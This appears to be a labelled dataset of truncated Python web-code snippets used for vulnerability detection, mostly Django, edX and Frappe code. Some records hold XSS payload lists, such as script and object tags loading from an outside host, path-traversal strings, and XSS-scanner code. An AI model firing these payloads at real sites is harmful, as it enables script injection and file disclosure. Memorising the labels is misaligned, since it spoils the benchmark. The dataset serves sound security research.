t2.avatar, t1.blogger, \t\t\t\t(select count", "label": 0}, {"snippet_id": 50483, "code": ", request): \"\"\" This is called by render_POST when the client is signalling that it is about to be closed. Args: request(Request): Incoming request. \"\"\" csessid=request.args.get('csessid')[0] try: sess", "label": 0}, {"snippet_id": 7721, "code": ">[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter", "label": 0}, {"snippet_id": 36793, "code": "\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1) \t\tcontext.parents", "label": 0}, {"snippet_id": 4967, "code": ")>', '<sCript x>confirm``</scRipt x>', '<Script x>prompt()</scRiPt x>', '<sCriPt sRc=//t.cn>', '<embed//sRc=//t.cn>', '<base href=//t.cn/><script src=/>', '<object//data=//t.cn>', '<s=\" onclick=confirm``", "label": 0}, {"snippet_id": 20443, "code": ":8031/auto_auth?{}\\\"\".format(cms_params)) sequence_url=\"/api/courses/v1/blocks/?{}\".format( urlencode({ \"course_id\": self.course_key, \"depth\": \"all\", \"all_blocks\": \"true\", }) ) auto_auth_params.update(", "label": 0}, {"snippet_id": 31482, "code": "[] \tfor key, value in p.items(): \t\tplots.append(value) \t\t \tgrid=gridplot(plots, ncols=2, plot_width=800, plot_height=250, toolbar_location=\"left\", toolbar_options=dict(logo=None)) \tshow(grid) \t if form", "label": 0}, {"snippet_id": 45167, "code": "([('uuid', d.content_object.uuid),('name', d.content_object.name)]) for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')] if coordinator_id and not filter(lambda a: a['uuid']=", "label": 0}, {"snippet_id": 6271, "code": ") if not res: res=None return res @property def debug(self): \"\"\" Set to True to log debug messages(boolean). \"\"\" return self.config.getboolean(self.section, 'debug') @property def syslog_debug(self): \"", "label": 0}, {"snippet_id": 49640, "code": " list_display we expect: 1. name of the field(string) or 2. two element iterable in which: -first element is name of the field(string) or callable which returns html -label for the column(string) \"\"\" if not self", "label": 0}, {"snippet_id": 51553, "code": "':{ 'context_processors':[ 'constance.context_processors.config', 'django.template.context_processors.debug', 'django.template.context_processors.request', 'django.contrib.auth.context_processors.auth'", "label": 0}, {"snippet_id": 14121, "code": "]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses", "label": 0}, {"snippet_id": 54950, "code": " project in projects: project.aggregate_stats() ProjectLocale.objects.get(locale=locale, project=project).aggregate_stats() def mark_changed_translation(changed_entities, locale): \"\"\"Mark entities as changed", "label": 0}, {"snippet_id": 28022, "code": "(base_handler.Handler): \"\"\"Session login handler.\"\"\" @handler.post(handler.JSON, handler.JSON) def post(self): \"\"\"Handle a post request.\"\"\" id_token=self.request.get('idToken') expires_in=datetime.timedelta", "label": 0}, {"snippet_id": 1115, "code": "\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param=='': vul_param +=key else: vul_param +=','+key except: logs", "label": 0}, {"snippet_id": 24121, "code": " setUp(self): super(TestPaverPa11yCrawlerCmd, self).setUp() mock_sh=patch('pavelib.utils.test.suites.bokchoy_suite.sh') self._mock_sh=mock_sh.start() self.addCleanup(mock_sh.stop) def _expected_command", "label": 0}, {"snippet_id": 5653, "code": "', '<deTails open oNToggle=confi\\u0072m()>', '<img sRc=l oNerrOr=(confirm)() x>', '<svg/x=\">\"/onload=confirm()//', '<svg%0Aonload=%09((pro\\u006dpt))()//', '<iMg sRc=x:confirm`` oNlOad=e\\u0076al(src)>',", "label": 0}, {"snippet_id": 7993, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts", "label": 0}, {"snippet_id": 6701, "code": " simple templating of forbidden.html. \"\"\" return self.config.get(self.section, 'dashboard_link') @property def password_reset_link(self): \"\"\" URL(string) for use in simple templating of login.html. \"\"\"", "label": 0}, {"snippet_id": 32830, "code": " self.wfile.write('<html><body>%s not found</body></html>' % self.path) def _DoUnknown(self): self._WriteHeader('text/html', status_code=501) self.wfile.write('<html><body>I do not know how to serve %s.<", "label": 0}, {"snippet_id": 18092, "code": "<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),", "label": 0}, {"snippet_id": 29753, "code": "*kwargs): \timport glob \tfile=set() \treturn_files=set() \t \tfor files in glob.glob(os.path.join(dir,'*.'+format)):\t\t\t\t \t\tfile.add(files.split('/')[-1]) \tfiles=sorted(file, reverse=True) \tif format=='cfg': ", "label": 0}, {"snippet_id": 23157, "code": ".add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 13001, "code": " import settings from django.conf.urls import patterns, include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth", "label": 0}, {"snippet_id": 32381, "code": "' % origin) retcode=1 try: s.serve_forever() except KeyboardInterrupt: retcode=130 except Exception as e: print('Exception raised: %s' % str(e)) s.shutdown() if thread: thread.join() return retcode def", "label": 0}, {"snippet_id": 37543, "code": "\t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}] \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def get_children()", "label": 0}, {"snippet_id": 41049, "code": "): \t\t \t\tif not cint(self.published): \t\t\traise Exception(\"This blog has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated=global_date_format(self.published_on) ", "label": 0}, {"snippet_id": 11368, "code": ".get_test_course() super(Pa11yCrawler, self).__enter__() def get_test_course(self): \"\"\" Fetches the test course. \"\"\" self.imports_dir.makedirs_p() zipped_course=self.imports_dir +'demo_course.tar.gz' msg", "label": 0}, {"snippet_id": 4929, "code": "(confirm)()//' '<imG/sRc=l oNerrOr=(prompt)() x>', '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>', '<deTails open oNToggle=confi\\u0072m()>', '<img sRc=l oNerrOr=(confirm)() x>', '<svg/x=\">\"/onload=confirm", "label": 0}, {"snippet_id": 18992, "code": "'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns", "label": 0}, {"snippet_id": 7185, "code": "'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$", "label": 0}, {"snippet_id": 51246, "code": ": resource_class=GroupResource admin.site.unregister(User) admin.site.register(User, UserAdmin) admin.site.unregister(Group) admin.site.register(Group, GroupAdmin) class CustomConfigForm(ConstanceForm)", "label": 0}, {"snippet_id": 38181, "code": ".as_dict(no_default_fields=True)) \treturn list_context def get_children(): \treturn frappe.db.sql(\"\"\"select route as name, \t\ttitle from `tabBlog Category` \t\twhere published=1 \t\tand exists(select name from", "label": 0}, {"snippet_id": 37071, "code": " as creation, \t\t\t\tt1.content as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type", "label": 0}, {"snippet_id": 7845, "code": "/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service", "label": 0}, {"snippet_id": 43718, "code": " true if fieldname is to be hidden for print. \t\tPrint Hide can be set via the Print Format Builder or in the controller as a list \t\tof hidden fields. Example \t\t\tclass MyDoc(Document): \t\t\t\tdef __setup__", "label": 0}, {"snippet_id": 6792, "code": " authn_info_mongo_uri(self): \"\"\" Authn info(failed logins etc.) MongoDB connection URI(string). See MongoDB documentation for details. If not set, Kantara authn logs will not be maintained. \"\"\" return self", "label": 0}, {"snippet_id": 36358, "code": " \"format_data_map\"): \t\t\treturn fieldname in doc.format_data_map \t\telse: \t\t\treturn True \tdef reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields): \t\t\"\"\"If the user does not have", "label": 0}, {"snippet_id": 35883, "code": "\t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS. \t\t\t-Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code' \t\t\"\"\" \t\tif frappe.flags.in_install: \t\t\treturn \t\tfor fieldname, value", "label": 0}, {"snippet_id": 36152, "code": "._precision[cache_key]: \t\t\tself._precision[cache_key][fieldname]=None \t\t\tdoctype=self.meta.get_field(parentfield).options if parentfield else self.doctype \t\t\tdf=frappe.get_meta(doctype).get_field(fieldname)", "label": 0}, {"snippet_id": 550, "code": " if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): if res_headers['Content-Type']: if 'application/json' or 'text/plain' in xss_request['Content-Type']:", "label": 1}, {"snippet_id": 4740, "code": "'onorientationchange', 'onpagehide', 'onpageshow', 'onpaste', 'onpause', 'onplay', 'onplaying', 'onpopstate', 'onprogress', 'onratechange', 'onreset', 'onresize', 'onscroll', 'onsearch', 'onseeked', 'onseeking', ", "label": 0}, {"snippet_id": 9824, "code": ".get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate", "label": 0}, {"snippet_id": 24499, "code": "'save_screenshots', False) def __enter__(self): super(BokChoyTestSuite, self).__enter__() self.log_dir.makedirs_p() self.har_dir.makedirs_p() self.report_dir.makedirs_p() test_utils.clean_reports_dir() if not(self", "label": 0}, {"snippet_id": 926, "code": ": parsed_url=url for payload in xss_payloads: xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) if xss_request_url.text.find(payload) !=-1: impact=check_xss_impact(xss_request_url.headers", "label": 1}, {"snippet_id": 54548, "code": ": class Meta: model=Comment fields=['content'] class UserDetail(DetailView): model=User template_name='user.html' def get_context_data(self, **kwargs): context=super().get_context_data(**kwargs) context", "label": 0}, {"snippet_id": 26947, "code": ")==0: r=requests.get(url=furl, params=post_params) else: r=requests.post(furl, data=post_params) if DEBUG==1: print post_params with open(\"response_\" +str(form_counter) +\"_\" +str(counter) +\".html\", \"w\"", "label": 0}, {"snippet_id": 44733, "code": "=json.loads(request.POST.get('copiedProperties', '{}')) _properties=dict(NODES[node['widgetType']].get_fields()) _properties.update(dict([(_property['name'], _property['value']) for _property in properties", "label": 0}, {"snippet_id": 29129, "code": " script) \tssh_command(serv, commands, print_out=\"1\") \t def waf_install(serv, **kwargs): \timport sql \tscript=\"waf.sh\" \ttmp_config_path=sql.get_setting('tmp_config_path') \tproxy=sql.get_setting('proxy') ", "label": 0}, {"snippet_id": 16952, "code": ".grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^", "label": 0}, {"snippet_id": 30838, "code": " None: \tfrom jinja2 import Environment, FileSystemLoader \tleft=form.getvalue('left') \tright=form.getvalue('right') \thap_configs_dir=funct.get_config_var('configs', 'haproxy_save_configs_dir') \tcmd='diff", "label": 0}, {"snippet_id": 22516, "code": ".generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue", "label": 0}, {"snippet_id": 10008, "code": "(unittest.TestCase): \"\"\" Paver Bok Choy Command test cases \"\"\" def _expected_command(self, name, store=None, verify_xss=False): \"\"\" Returns the command that is expected to be run for the given test spec", "label": 1}, {"snippet_id": 12991, "code": "=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404", "label": 0}, {"snippet_id": 32978, "code": "=None): if relative_to is None: relative_to=self.server.top_level assert not relpath.startswith(os.sep) path=os.path.join(relative_to, relpath) with codecs.open(path, encoding='utf-8') as fp: return fp", "label": 0}, {"snippet_id": 19891, "code": " self.test_spec=kwargs.get('test_spec', None) self.default_store=kwargs.get('default_store', None) self.verbosity=kwargs.get('verbosity', DEFAULT_VERBOSITY) self.num_processes=kwargs.get('num_processes", "label": 0}, {"snippet_id": 38702, "code": "(self, key=None, filters=None, limit=None, default=None): \t\tif key: \t\t\tif isinstance(key, dict): \t\t\t\treturn _filter(self.get_all_children(), key, limit=limit) \t\t\tif filters: \t\t\t\tif isinstance(filters, dict", "label": 0}, {"snippet_id": 17089, "code": "=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]", "label": 0}, {"snippet_id": 19750, "code": "): test_dir -parent directory for tests log_dir -directory for test output report_dir -directory for reports(e.g., coverage) related to test execution xunit_report -directory for xunit-style output(xml", "label": 0}, {"snippet_id": 37404, "code": "\t\t\tcontext.comment_text=_('1 comment') \t\t\telse: \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category", "label": 0}, {"snippet_id": 48917, "code": ".render_function: return self.column.render_function(self.object) field=getattr(self.object, self.column.field_name) if self.column.field_name else None if type(self.object)==dict: value=self.object.get(self", "label": 1}, {"snippet_id": 20598, "code": ".conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns", "label": 0}, {"snippet_id": 52746, "code": "=Workflow(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm, extra=0) if request.method=='POST': params_form=ParametersFormSet(request.POST) if params_form.is_valid()", "label": 0}, {"snippet_id": 542, "code": ": path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): if res_headers['Content-Type']: if 'application", "label": 1}, {"snippet_id": 17371, "code": "='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views", "label": 0}, {"snippet_id": 28174, "code": ".get_data('config') +\".cfg\" if serv is not None and form.getvalue('open') is not None: \t \ttry: \t\tfunct.logging(serv, \"config.py open config\") \texcept: \t\tpass \t \terror=funct.get_config(serv, cfg) \t \ttry: \t\tconf", "label": 0}, {"snippet_id": 3756, "code": ",headers,body,scanid=None): print url, headers,method,body temp_body={} post_vul_param='' for key,value in body.items(): xss_payloads=fetch_xss_payload() for payload in xss_payloads: temp_body.update(body", "label": 0}, {"snippet_id": 28321, "code": "('serv') def get_app_dir(): \td=sys.path[0] \td=d.split('/')[-1]\t\t \treturn sys.path[0] if d==\"app\" else os.path.dirname(sys.path[0])\t def get_config_var(sec, var): \tfrom configparser import ConfigParser,", "label": 0}, {"snippet_id": 37638, "code": "] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape", "label": 0}, {"snippet_id": 12575, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]", "label": 0}, {"snippet_id": 7156, "code": "\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id':", "label": 0}, {"snippet_id": 18264, "code": "[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views", "label": 1}, {"snippet_id": 30874, "code": ".do\"]) \ttemplate=env.get_template('compare.html') \t \toutput, stderr=funct.subprocess_execute(cmd) \ttemplate=template.render(stdout=output)\t \t \tprint(template) \tprint(stderr) \t if serv is not None and act", "label": 0}, {"snippet_id": 46846, "code": " @property async def content(self): rv=await self.get_props_by_key('content') if rv: return rv.decode('utf-8') @property async def html_content(self): content=await self.content if not content: return '", "label": 1}, {"snippet_id": 16285, "code": "\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i", "label": 0}, {"snippet_id": 52422, "code": " workflow_doc.save() workflow_instance=Workflow(document=workflow_doc) response['status']=0 response['id']=workflow_doc.id response['doc1_id']=workflow_doc.doc.get().id response['message']=_('Page saved !", "label": 0}, {"snippet_id": 32310, "code": " args.port print('Listening on %s/' % origin) thread=None if args.file: path=os.path.realpath(args.file) if not path.startswith(top_level): print('%s is not under %s' %(args.file, args.directory)) return 1", "label": 0}, {"snippet_id": 17886, "code": "'404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$", "label": 0}, {"snippet_id": 11917, "code": ", name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify", "label": 0}, {"snippet_id": 6937, "code": ".MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"),", "label": 0}, {"snippet_id": 32036, "code": " from horizon import tables from openstack_dashboard import api class CreateMappingLink(tables.LinkAction): name=\"create\" verbose_name=_(\"Create Mapping\") url=\"horizon:identity:mappings:create\" classes", "label": 0}, {"snippet_id": 46776, "code": " ReactItem from.signals import comment_reacted from.utils import RedisSettings markdown=mistune.Markdown() MC_KEY_COMMENT_LIST='comment:%s:comment_list' MC_KEY_N_COMMENTS='comment:%s:n_comments' MC_KEY_COMMNET_IDS_LIKED_BY_USER", "label": 0}, {"snippet_id": 3070, "code": " as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): print \"response header\",res_headers['Content-Type'] if res_headers['Content-Type'", "label": 0}, {"snippet_id": 46310, "code": "{\"size\":12,\"rows\":[{\"widgets\":[ {\"size\":12,\"name\":\"Grid Results\",\"id\":\"52f07188-f30f-1296-2450-f77e02e1a5c0\",\"widgetType\":\"resultset-widget\", \"properties\":{},\"offset\":0,\"isLoading\":True,\"klass\":\"card card", "label": 0}, {"snippet_id": 38804, "code": "=value \tdef delete_key(self, key): \t\tif key in self.__dict__: \t\t\tdel self.__dict__[key] \tdef append(self, key, value=None): \t\tif value==None: \t\t\tvalue={} \t\tif isinstance(value,(dict, BaseDocument)): \t\t", "label": 0}, {"snippet_id": 42562, "code": "(e.args[1]): \t\t\t\tself.show_unique_validation_message(e) \t\t\telse: \t\t\t\traise \tdef show_unique_validation_message(self, e): \t\ttype, value, traceback=sys.exc_info() \t\tfieldname, label=str(e).split(\"'\")[-2],", "label": 0}, {"snippet_id": 48791, "code": ".utils.translation import gettext_lazy as _ from typing import List from smart_lists.exceptions import SmartListException from smart_lists.filters import SmartListFilter class TitleFromModelFieldMixin(object", "label": 0}, {"snippet_id": 34298, "code": "\tself.set(key, d.get(key)) \t\tfor key, value in iteritems(d): \t\t\tself.set(key, value) \t\treturn self \tdef update_if_missing(self, d): \t\tif isinstance(d, BaseDocument): \t\t\td=d.get_valid_dict() \t\tif \"doctype", "label": 0}, {"snippet_id": 23758, "code": "/custom_a11y_rules.js', verify_xss=verify_xss ) return expected_statement def setUp(self): super(TestPaverBokChoyCmd, self).setUp() self.shard=os.environ.get('SHARD') self.env_var_override=EnvironmentVarGuard(", "label": 0}, {"snippet_id": 17490, "code": " urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns", "label": 0}, {"snippet_id": 36200, "code": " translated=False): \t\tfrom frappe.utils.formatters import format_value \t\tdf=self.meta.get_field(fieldname) \t\tif not df and fieldname in default_fields: \t\t\tfrom frappe.model.meta import get_default_df \t\t\tdf", "label": 0}, {"snippet_id": 5708, "code": "/oNMousEDown=((confirm))()>Click', '<a/href=javascript&colon;co\\u006efirm& '<img src=x onerror=confir\\u006d`1`>', '<svg/onload=co\\u006efir\\u006d`1`>', '<?xml version=\"1.0\"?><html><script xmlns=\"http://www.w3.org", "label": 0}, {"snippet_id": 33094, "code": " components import auth from components import config as config_api from components import decorators from components import endpoints_webapp2 from components import prpc import webapp2 from legacy import api as", "label": 0}, {"snippet_id": 19524, "code": "\"\" If an invalid combination of verbosity and number of processors is passed in, a BuildFailure should be raised \"\"\" suite=BokChoyTestSuite('', num_processes=2, verbosity=3) with self.assertRaises(BuildFailure", "label": 0}, {"snippet_id": 7454, "code": "'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+", "label": 0}, {"snippet_id": 1506, "code": ") global db db=client.apiscan def generate_hash(): scanid=hashlib.md5(str(time.time())).hexdigest() return scanid @app.route('/scan/', methods=['POST']) def start_scan(): scanid=generate_hash() content", "label": 0}, {"snippet_id": 6929, "code": ".urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=(''", "label": 0}, {"snippet_id": 30392, "code": ": Something Else\",err) \t\t \tdata=response.content \tprint(data.decode('utf-8')) if serv is not None and form.getvalue('rows') is not None: \trows=form.getvalue('rows') \twaf=form.getvalue('waf') \tgrep=form", "label": 0}, {"snippet_id": 22331, "code": ".password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat", "label": 0}, {"snippet_id": 25649, "code": " else orderpos.attendee_email) ) for q in questions: answers=[a for a in pos.answerlist if a.question_id==q.id] if answers: initial=answers[0] else: initial=None tz=pytz.timezone(event.settings.timezone", "label": 0}, {"snippet_id": 25791, "code": ".first() if initial else None, ) elif q.type==Question.TYPE_CHOICE_MULTIPLE: field=forms.ModelMultipleChoiceField( queryset=q.options, label=q.question, required=q.required, help_text=help_text, widget", "label": 0}, {"snippet_id": 49269, "code": " self.model=model self.field_name=field self.label=label self.render_function=render_function self.order_field=None self.order=None if not self.field_name: return if self.field_name.startswith(\"_\") and", "label": 0}, {"snippet_id": 46221, "code": "'collection': collection, 'query': query, 'initial': json.dumps({ 'collections': collections, 'layout': DEFAULT_LAYOUT, 'is_latest': LATEST.get(), 'engines': get_engines(request.user) }), 'is_owner': True,", "label": 0}, {"snippet_id": 42150, "code": "[fieldname]=cint(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float): \t\t\t\t\td[fieldname]=flt(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Datetime\",", "label": 0}, {"snippet_id": 21506, "code": "+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading", "label": 0}, {"snippet_id": 47299, "code": " assert res.status_code==200 res=client.post( delete_view_url, data={'id': rec_uuid}, follow_redirects=True) assert res.status_code==200 res=client.get(detail_view_url) assert res.status_code==200 assert ", "label": 0}, {"snippet_id": 27567, "code": "\" def is_cron(self): \"\"\"Return true if the request is from a cron job.\"\"\" return bool(self.request.headers.get('X-Appengine-Cron')) def render_forbidden(self, message): \"\"\"Write HTML response for 403.\"", "label": 0}, {"snippet_id": 5080, "code": "', '<link rel=\"import\" href=\"test.svg\" />', '<iframe srcdoc=\"&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;\" />', ] class XSS(Fuzzer): \"\"\"generate XSS payload\"\"\" tags=_tags events=_events", "label": 0}, {"snippet_id": 54170, "code": "'light sky blue').grid(row=0) Label(main, text=\"Cookie:(Optional)\",background='light sky blue').grid(row=1) Label(main, text=\"Method:\",background='light sky blue').grid(row=2) Label(main, text=\"Timeout", "label": 0}, {"snippet_id": 944, "code": ") xss_result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(payload) !=-1: impact=check_xss_impact() xss_result=True if xss_result is True", "label": 1}, {"snippet_id": 19323, "code": "( suite.cmd, self._expected_command(name=name, store='invalid') ) def test_serversonly(self): suite=BokChoyTestSuite('', serversonly=True) self.assertEqual(suite.cmd, \"\") def test_verify_xss(self): suite", "label": 0}, {"snippet_id": 26740, "code": " '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '../../boot.ini%00', '../../../boot.ini%00', '../../../../boot.ini%00', '../../../../../boot.ini%00', '../../../..", "label": 0}, {"snippet_id": 33619, "code": ".blogger: \t\t\tcontext.blogger_info=frappe.get_doc(\"Blogger\", self.blogger).as_dict() \t\tcontext.description=self.blog_intro or self.content[:140] \t\tcontext.metatags={ \t\t\t\"name\": self.title, \t\t\t\"description", "label": 0}, {"snippet_id": 29936, "code": "/keys/') \t \tssh_keys=os.path.dirname(os.getcwd())+'/keys/'+name+'.pem' \t \ttry: \t\twith open(ssh_keys, \"w\") as conf: \t\t\tconf.write(form.getvalue('ssh_cert')) \texcept IOError: \t\tprint('<div class=\"alert alert", "label": 0}, {"snippet_id": 41857, "code": "\t\tif value is None and key not in self.ignore_in_getter \\ \t\t\t\tand key in(d.fieldname for d in self.meta.get_table_fields()): \t\t\t\tself.set(key,[]) \t\t\t\tvalue=self.__dict__.get(key) \t\t\treturn value \t\telse", "label": 0}, {"snippet_id": 37077, "code": "(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment' \t\t\t\t\t\tand comment_type='Comment", "label": 0}, {"snippet_id": 14594, "code": "}/test_root/log{shard_str}/hars' \" \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' \" \"SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' \" \"VERIFY_XSS='{verify_xss}' \" \"nosetests", "label": 0}, {"snippet_id": 47963, "code": ", HttpResponseBadRequest from frontpage.models import Profile, Media, MediaUpload from frontpage.management.magic import compile_markdown, get_current_user import logging import ntpath import os import", "label": 0}, {"snippet_id": 34050, "code": ".content=strip_html_tags(post.content[:340]) \t\tif not post.comments: \t\t\tpost.comment_text=_('No comments yet') \t\telif post.comments==1: \t\t\tpost.comment_text=_('1 comment') \t\telse: \t\t\tpost.comment_text=_('", "label": 0}, {"snippet_id": 48250, "code": ": str=''' { \"notes\": \"\", \"articles\":[], \"pickup_date\": \"\" } ''' def update_reservation_articles(postdict, rid): res: GroupReservation=GroupReservation.objects.get(id=rid) def add_article_action(request", "label": 0}, {"snippet_id": 33227, "code": "(build).get_result() if not can_view: if auth.get_current_identity().is_anonymous: return self.redirect(gae_users.create_login_url(self.request.url)) self.response.write('build %d not found' % build_id", "label": 1}, {"snippet_id": 40252, "code": "\treturn \t\tfor fieldname, value in self.get_valid_dict().items(): \t\t\tif not value or not isinstance(value, string_types): \t\t\t\tcontinue \t\t\tvalue=frappe.as_unicode(value) \t\t\tif(u\"<\" not in value and u\">\" not in", "label": 0}, {"snippet_id": 29396, "code": " e: \t\terror +=e \tif error: \t\treturn error \t\t def open_port_firewalld(cfg): \ttry: \t\tconf=open(cfg, \"r\") \texcept IOError: \t\tprint('<div class=\"alert alert-danger\">Can\\'t read export config file</div>') \t ", "label": 0}, {"snippet_id": 40133, "code": ": \t\t\t\t\t\treference=\"{0}{1}\".format(_(self.doctype), self.name) \t\t\t\t\tfrappe.throw(_(\"{0}: '{1}'({3}) will get truncated, as max characters allowed is{2}\")\\ \t\t\t\t\t\t.format(reference, 